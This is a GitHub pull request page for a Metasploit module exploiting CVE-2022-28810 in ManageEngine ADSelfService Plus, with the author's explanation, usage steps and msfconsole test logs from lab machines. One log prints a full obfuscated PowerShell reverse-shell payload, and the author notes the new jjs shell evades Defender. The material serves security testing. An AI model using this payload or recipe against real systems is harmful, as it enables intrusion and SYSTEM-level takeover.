
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16475)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16475)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.5k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  414](/rapid7/metasploit-framework/issues)
* [Pull requests
  35](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# ManageEngine ADSelfService Plus Authenticated RCE (CVE-2022-28810) #16475

 Merged

[smcintyre-r7](/smcintyre-r7)
merged 3 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[jbaines-r7:cve\_2022\_28810](/jbaines-r7/metasploit-framework/tree/cve_2022_28810 "jbaines-r7/metasploit-framework:cve_2022_28810")

Apr 20, 2022

 Merged

# [ManageEngine ADSelfService Plus Authenticated RCE (CVE-2022-28810)](#top) #16475

[smcintyre-r7](/smcintyre-r7)
merged 3 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[jbaines-r7:cve\_2022\_28810](/jbaines-r7/metasploit-framework/tree/cve_2022_28810 "jbaines-r7/metasploit-framework:cve_2022_28810")

Apr 20, 2022

[Conversation
13](/rapid7/metasploit-framework/pull/16475)
[Commits
3](/rapid7/metasploit-framework/pull/16475/commits)
[Checks
0](/rapid7/metasploit-framework/pull/16475/checks)
[Files changed](/rapid7/metasploit-framework/pull/16475/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=60&v=4)](/jbaines-r7)

Copy link

Contributor

### @jbaines-r7 **[jbaines-r7](/jbaines-r7)** commented [Apr 19, 2022](#issue-1208736140)

This is an implementation of an attack [Rapid7](https://www.rapid7.com/blog/post/2022/04/14/cve-2022-28810-manageengine-adselfservice-plus-authenticated-command-execution-fixed/) observed in the wild against ManageEngine ADSelfService Plus (ADSSP). Attackers were using the ADSSP's "custom script" functionality to execute arbitrary operating system commands whenever domain users reset their passwords. The "custom script" logic can only be accessed by the `admin` user, but `admin` has a default password (`admin`) that isn't getting changed as often as you'd hope.

The "custom script" functionality that this module abuses was removed in build 6122 to address [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810"). The vendor worded [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810") in such a way that it's unclear if they think the specific behavior this module abuses falls under the umbrella of [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810"). But, since my name is associated with the CVE, I'm going to claim some type of authoritative knowledge and say, "Yes, fixing [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810") is in part about preventing arbitrary command execution using custom scripts."

Anyway. There are a few of "interesting" things about this module because isn't there always?

## jjs is good

In the wild, the attacker was executing powershell to download stuff and whatever. Which is fine. But I thought this was a good opportunity to use `jjs` since ADSSP installs Java in tree and we always know where it is relative to our working directory. This was extra interesting because we didn't have a `jjs` reverse shell for Windows, and it is actually a good use for this vulnerability.

So this pull request also adds a reverse shell for Windows using jjs. It's almost entirely a copy and paste of [@bcoles](https://github.com/bcoles) work... to the point I didn't take any credit (there were a few minor tweaks but nothing to get all excited about). I enjoy `jjs` because the payload will execute "in memory" ish and Defender still seems not to give a hoot about it so you never have to mess around with builtin Windows AV. I actually published my own [jjs c2](https://github.com/jacob-baines/longtime-sunshine) a number of months before the cited links in the `jjs_reverse_tcp.rb` but I'm sure others did too. Either way, jjs is good. I'm very happy to use jjs here.

There's always the argument that the module should drop meterpeter but this is likely to be the more successful solution

## DisablePayloadHandler

This module sets `DisablePayloadHandler` to true and then starts it's own payload handler (code which was stolen almost wholesale from `windows/local/persistence.rb`). This is a side affect from the module requiring user interaction to execute the payload. The module is set to `passive` so it can wait in the background, but it will simply exit after a brief timeout if using the default payload handler. Hence controlling it's own handler is the solution.

## TARGET\_RESET

Exploitation leaves our payload in the custom script form, so I added an option that will simply clean up the target if the user specifies `true`. Again, due to the user interaction nature of this attack, there isn't a great time to clean everything up (it's not as simple as deleting a file), so I figured this was a reasonable solution. 🤷

## Default port

By default this thing installs as HTTP on 8888. It can be configured to use HTTPs (9251 by default). I left the default port as 8888 with SSL set to false, but I think it's more likely that exploitable cases will be using HTTPs. Thoughts? Should I switch it over?

I've attached both video and pcap demonstrating exploitation. The video is worth a watch to understand what is happening, probably. The pcap should be useful for all of our signature writing friends (it's HTTP by default 😱). That's it.

## Verification

List the steps needed to make sure this thing works

* Follow the setup steps in the documentation
* Start `msfconsole`
* use exploit/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810`
* `set RHOST <ip>`
* `set LHOST <ip>`
* `check`
* Verify the remote host is vulnerable.
* `run`
* Verify the module is waiting for a reverse TCP connection
* Navigate to the ADSelfService Plus web UI and reset your test users password.
* After a new password has been set, verify the module received a reverse shell.
* Exit the shell
* Do `set TARGET_RESET true`
* Do `run`
* Navigate to the ADSelfService Plus web UI, log in as admin, and verify that the custom

  scripts have been removed and disabled ("Configuration" -> "Self Service" ->

  "Policy Configuration" -> "Advanced" -> "Password Sync")

## Video || GTFO

<https://www.youtube.com/watch?v=eQxth9FUkJE>

## PCAP || GTFO

[manageengine\_adssp\_reverse\_shell.zip](https://github.com/rapid7/metasploit-framework/files/8515239/manageengine_adssp_reverse_shell.zip)

Sorry, something went wrong.

 👍
3
 smcintyre-r7, wvu, and Kr0ff reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

 [jbaines-r7](/jbaines-r7)
added 2 commits
[April 19, 2022 10:33](#commits-pushed-ae54c8c)

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=40&v=4)](/jbaines-r7)

`[Initial implementation of authenticated RCE against ManageEngine ADSe…](/rapid7/metasploit-framework/pull/16475/commits/ae54c8c3d9e8ecb8bc29a601cdc57c91684d3a35 "Initial implementation of authenticated RCE against ManageEngine ADSelfService Plus (CVE-2022-28810)")`
 …

`[ae54c8c](/rapid7/metasploit-framework/pull/16475/commits/ae54c8c3d9e8ecb8bc29a601cdc57c91684d3a35)`

```
…lfService Plus ([CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810"))
```

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=40&v=4)](/jbaines-r7)

`[Fixed the name of the jjs cmd](/rapid7/metasploit-framework/pull/16475/commits/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda "Fixed the name of the jjs cmd")`

`[c77e12e](/rapid7/metasploit-framework/pull/16475/commits/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda)`

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
self-assigned this
[Apr 19, 2022](#event-6457757153)

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
added
[module](/rapid7/metasploit-framework/labels/module)
[docs](/rapid7/metasploit-framework/labels/docs)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
labels
[Apr 19, 2022](#event-6457769651)

[![smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=60&v=4)](/smcintyre-r7)

**[smcintyre-r7](/smcintyre-r7)**
requested changes
[Apr 19, 2022](#pullrequestreview-946199851)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda)

Copy link

Contributor

### @smcintyre-r7 **[smcintyre-r7](/smcintyre-r7)** left a comment • edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Module is working great. The detailed setup steps were super helpful. I just left a few comments based on my review.

Testing Output
```
msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. This determination is based on the version string: 6121.
[+] Authentication successful
[*] Requesting policy list from /ServletAPI/configuration/policyConfig/getPolicyConfigDetails
[*] Requesting policy details for msflab.local
[*] Payload: cmd.exe /c powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAMAnX2ICA5VVXW8aORR951dcoelmRgEL0HbVRkq17DRdRcq2qJNtHhBSjOcSZmNs1vYEUMJ/rz3j+SAkausH'+'{1}PteHx+fe2wvcsFMJgX8jaZ/g3P{1}MxQ{1}Oo8dsC3YMDiHz7jpf5n/h8xA/3q3xs90hXbQEJs'+'fF/lVMvlX40dc0JybW{1}FqIxnl2kIERuVYZ02U3O7Isww7'+'3hqpcjv7zqKiu'+'JYbVLZn2UERn1BFV2H5PU2Mys{2}dLIjlakVF2jsc{2}{2}RnUjwb/Cg3gkuaFqORx1SSodbgBVjJNOfoCP4ZRlCmZAsIq2Wgj/9Dd56JtBsVwXJeMZdn2qBAZSdPk539Xh{1}nWiLZPRpNrtn6ymfMfrfteCLRhir'+'j1vUrF1FfovNW3pgxXBsLWJYjLKnsX6Or8A{1}VxmP{1}NXSr5C8xjyd+oe7w/YgM/3hHhm/fk+HoXbfnduKX75QSaqOQrhzfEp5YqyXFmOXZMCwrVBJ0bun6gr{2}oac2{2}CuwVhshylZkdSarU0K/'+'fCxbWVtgLH4'+'Nri76HPtUwPZjzFVfSYIzKZIuMUYPfKM9S6rwXU87nlN3PougFOmScm6Uzrps01q9qE4ic817XcD0cd{2}2hNl4t'+'VLPRtpL{2}+c7gdDYL3L+z5ICQ0cC2pzePg70X{1}0V'+'ahcOpwa0hKJhMnd/PzsZJfHkZuQL85XLC7o01rtxomLijlSyRc1C5EDYbrDy5tubtwi'+'kEKB7OXE+4o39qx2yl6gC{2}q3VumuCtiOV6p7K7pYEwjuCfjCmp5cJALNVaqkJRAmO'+'3mEvSoNBiP2BKbsWt8Lb0cpAbWxsMm431Br2mQ65Q3Jll20fVoW476chIv6bS9HQ{1}VxbSyeIvBFLz/HWu1axPUl1QtrScS1DIRH3hNFkNbdfCg3s6ItVuyyutQoqeLsWD'+'vMf+xXZttdVW7xpl37bUZplxDMMgK1xXbuIr0jQsPdaDQQ+CA/YR9AXC4EjSC6cfptdWy9eeDH9OXQopNL7wmjco9rRRR6WF5q+LYneVqBBk0bNq2sPpinm0b+hXV18JPvrw2'+'xCe4Etu+iUqePMcQI2gEKQCPoW{2}SQIn9r/Q/0qywsMRmVCzdNEPcNKAbB2RAJWSajqYHSzWYl3ECeNIVRi9xOC83bFHbds5NvBP+beB+aFj24Y98ms15xPP9bJ+Df3F4+/2mEuNfj/FcazeqLZhmocrMXJdvVb+1zqzfujr2vkX6zsNqLftrggAAA{0}{0}')-f'=','G','T')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] Enabling custom scripts and inserting the payload
[*] Posting updated policy configuration to /ServletAPI/configuration/policyConfig/setAPCDetails
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.159.128:4444

msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >
msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > [*] Powershell session session 3 opened (192.168.159.128:4444 -> 192.168.159.87:50092 ) at 2022-04-19 17:21:52 -0400

msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > sessions -i 3
[*] Starting interaction with 3...

PS C:\ManageEngine\ADSelfService Plus\bin> exit

[*] 192.168.159.87 - Powershell session session 3 closed.  Reason: User exit
msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >

```

Sorry, something went wrong.

All reactions

[documentation/modules/exploit/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.md](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-ddda11c33d5c610d32bf8a3589c8f07c6d7560a9ecfb1b4a4e52b935f84f10ea)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.rb](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-b4c0277b3a56016c787a6a359497b8309dcb1c79e244dae71155fc726e334337)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.rb](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-b4c0277b3a56016c787a6a359497b8309dcb1c79e244dae71155fc726e334337)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.rb](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-b4c0277b3a56016c787a6a359497b8309dcb1c79e244dae71155fc726e334337)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.rb](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-b4c0277b3a56016c787a6a359497b8309dcb1c79e244dae71155fc726e334337)
Outdated

Show resolved

Hide resolved

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=40&v=4)](/jbaines-r7)

`[Improve JSON cleanup, fix jjs specific wording, and moved JJS_PATH to…](/rapid7/metasploit-framework/pull/16475/commits/aba48a69058b1b385d2999255f3f53005ad4cde2 "Improve JSON cleanup, fix jjs specific wording, and moved JJS_PATH to defaultoptions")`
 …

`[aba48a6](/rapid7/metasploit-framework/pull/16475/commits/aba48a69058b1b385d2999255f3f53005ad4cde2)`

```
… defaultoptions
```

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=80&u=c5dc1f8c51eff0330bb7a5b2851cebaf5098d536&v=4)](/jbaines-r7)

Copy link

Contributor

Author

### **[jbaines-r7](/jbaines-r7)** commented [Apr 20, 2022](#issuecomment-1103932726)

| Updated to address all comments. Thanks for that bit of JSON clean-up code, Spencer! That makes this a bit less sketchy 😄  Retested:  ``` msf6 > use exploit/windows/http/manageengine_adselfservice_plus_cve_2022_28810 [*] Using configured payload cmd/windows/jjs_reverse_tcp msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set RHOST 10.0.0.20 RHOST => 10.0.0.20 msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set LHOST 10.0.0.2 LHOST => 10.0.0.2 msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > check [*] 10.0.0.20:8888 - The target appears to be vulnerable. This determination is based on the version string: 6121. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > run [*] Exploit running as background job 0.  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. This determination is based on the version string: 6121. [+] Authentication successful [*] Requesting policy list from /ServletAPI/configuration/policyConfig/getPolicyConfigDetails [*] Requesting policy details for okhuman.ninja [*] Enabling custom scripts and inserting the payload [*] Posting updated policy configuration to /ServletAPI/configuration/policyConfig/setAPCDetails [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.0.0.2:4444  [*] Command shell session 1 opened (10.0.0.2:4444 -> 10.0.0.20:50151 ) at 2022-04-20 06:24:15 -0700  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > sessions 1 [*] Starting interaction with 1...   Shell Banner: M -----             C:\ManageEngine\ADSelfService Plus\bin>whoami whoami nt authority\system  C:\ManageEngine\ADSelfService Plus\bin>exit [*] 10.0.0.20 - Command shell session 1 closed. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set TARGET_RESET true TARGET_RESET => true msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > run [*] Exploit running as background job 2. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. This determination is based on the version string: 6121. [+] Authentication successful [*] Requesting policy list from /ServletAPI/configuration/policyConfig/getPolicyConfigDetails [*] Requesting policy details for okhuman.ninja [*] Disabling custom script functionality [*] Posting updated policy configuration to /ServletAPI/configuration/policyConfig/setAPCDetails [+] Done!  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  ```  And manually verified the custom scripts fields were reset. |
| --- |

All reactions

Sorry, something went wrong.

 [![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=40&u=c5dc1f8c51eff0330bb7a5b2851cebaf5098d536&v=4)](/jbaines-r7)
[jbaines-r7](/jbaines-r7)
requested a review
from [smcintyre-r7](/smcintyre-r7)
[April 20, 2022 13:37](#event-6463261404)

[![@wvu](https://avatars.githubusercontent.com/u/4551878?s=80&u=99426fa1baf3d6e40a669942251d846cf81a9c25&v=4)](/wvu)

Copy link

Contributor

### **[wvu](/wvu)** commented [Apr 20, 2022](#issuecomment-1104243154)

| Yay, a `jjs` shell! |
| --- |

 ❤️
1
 jbaines-r7 reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

[smcintyre-r7](/smcintyre-r7)
added a commit
that referenced
this pull request
[Apr 20, 2022](#ref-commit-8e2bd3c)
[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)

`[Land](/rapid7/metasploit-framework/commit/8e2bd3c5a94dd2e8c1e9aed42b9805fe83460410 "Land #16475, ManageEngine ADSelfService Plus RCE") [#16475](https://github.com/rapid7/metasploit-framework/pull/16475)[, ManageEngine ADSelfService Plus RCE](/rapid7/metasploit-framework/commit/8e2bd3c5a94dd2e8c1e9aed42b9805fe83460410 "Land #16475, ManageEngine ADSelfService Plus RCE")`

`[8e2bd3c](/rapid7/metasploit-framework/commit/8e2bd3c5a94dd2e8c1e9aed42b9805fe83460410)`

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
merged commit [`aba48a6`](/rapid7/metasploit-framework/commit/aba48a69058b1b385d2999255f3f53005ad4cde2)
into
rapid7:master

[Apr 20, 2022](https://github.com/rapid7/metasploit-framework/pull/16475#event-6465715116)

[![smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=60&v=4)](/smcintyre-r7)

**[smcintyre-r7](/smcintyre-r7)**
approved these changes
[Apr 20, 2022](#pullrequestreview-947658582)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16475/files/aba48a69058b1b385d2999255f3f53005ad4cde2)

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=80&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)

Copy link

Contributor

### **[smcintyre-r7](/smcintyre-r7)** commented [Apr 20, 2022](#issuecomment-1104372022)

| Thanks for implementing those changes. I just retested the module and confirmed it's still working.  ```  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set RHOSTS 192.168.159.87 RHOSTS => 192.168.159.87 msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > check [*] 192.168.159.87:8888 - The target appears to be vulnerable. This determination is based on the version string: 6121. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > exploit [*] Exploit running as background job 0. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. This determination is based on the version string: 6121.  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  [+] Authentication successful [*] Requesting policy list from /ServletAPI/configuration/policyConfig/getPolicyConfigDetails [*] Requesting policy details for msflab.local [*] Enabling custom scripts and inserting the payload [*] Posting updated policy configuration to /ServletAPI/configuration/policyConfig/setAPCDetails [*] Starting exploit/multi/handler   [*] Started reverse TCP handler on 192.168.159.128:4444  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > [*] Command shell session 1 opened (192.168.159.128:4444 -> 192.168.159.87:58544 ) at 2022-04-20 15:20:39 -0400  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > sessions  Active sessions ===============    Id  Name  Type               Information                                                                      Connection   --  ----  ----               -----------                                                                      ----------   1         shell cmd/windows  Shell Banner: Microsoft Windows [Version 10.0.19044.1645] (c) Microsoft Corp...  192.168.159.128:4444 -> 192.168.159.87:58544  (192.168.159.87)  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > sessions -i -1 [*] Starting interaction with 1...   Shell Banner: Microsoft Windows [Version 10.0.19044.1645] (c) Microsoft Corporation. All rights reserved.  C:\ManageEngine\ADSelfService Plus\bin> -----            get uidC:\ManageEngine\ADSelfService Plus\bin> getuid 'getuid' is not recognized as an internal or external command, operable program or batch file.  C:\ManageEngine\ADSelfService Plus\bin>whoami whoami nt authority\system  C:\ManageEngine\ADSelfService Plus\bin>exit [*] 192.168.159.87 - Command shell session 1 closed.  ```  Merged! |
| --- |

 🎉
1
 jbaines-r7 reacted with hooray emoji

All reactions

* 🎉
  1 reaction

Sorry, something went wrong.

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=80&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)

Copy link

Contributor

### **[smcintyre-r7](/smcintyre-r7)** commented [Apr 20, 2022](#issuecomment-1104373148)

| Release Notes This adds an exploit for [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810") which is an authenticated RCE in ManageEngine ADSelfService Plus. |
| --- |

All reactions

Sorry, something went wrong.

[![@jmartin-tech](https://avatars.githubusercontent.com/u/7873740?s=40&v=4)](/jmartin-tech)
[jmartin-tech](/jmartin-tech)
mentioned this pull request
[Jun 15, 2022](#ref-pullrequest-1272646454)

[Fix missing and incomplete specs
#16679](/rapid7/metasploit-framework/pull/16679)
 Merged

1 task

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16475)

Reviewers

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&v=4)](/smcintyre-r7) [smcintyre-r7](/smcintyre-r7)

smcintyre-r7 approved these changes

Assignees

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&v=4)](/smcintyre-r7) [smcintyre-r7](/smcintyre-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=52&v=4)](/jbaines-r7) [![@wvu](https://avatars.githubusercontent.com/u/4551878?s=52&v=4)](/wvu) [![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=52&v=4)](/smcintyre-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
